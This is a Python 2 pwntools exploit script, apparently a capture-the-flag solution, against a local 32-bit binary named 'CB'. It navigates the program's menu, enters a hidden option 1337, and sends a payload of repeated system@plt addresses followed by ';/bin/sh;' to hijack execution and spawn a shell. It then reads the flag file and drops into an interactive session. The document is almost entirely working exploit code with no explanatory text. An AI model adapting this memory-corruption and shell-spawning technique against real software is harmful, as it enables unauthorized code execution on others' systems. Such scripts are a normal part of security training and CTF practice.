from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')


'''
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x8048480 <system@plt>
'''
s.sendline(str(0xdead))
system = 0x8048480
def go(n):
	s.recvuntil('4. info')
	s.sendline(str(n))

go(1)
s.recvuntil('name:')
s.sendline('2')
s.recvuntil('age :')
s.sendline('2')
go(1337)
s.sendline(p32(system)*8+';/bin/sh;\x00')
s.sendline('4')

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

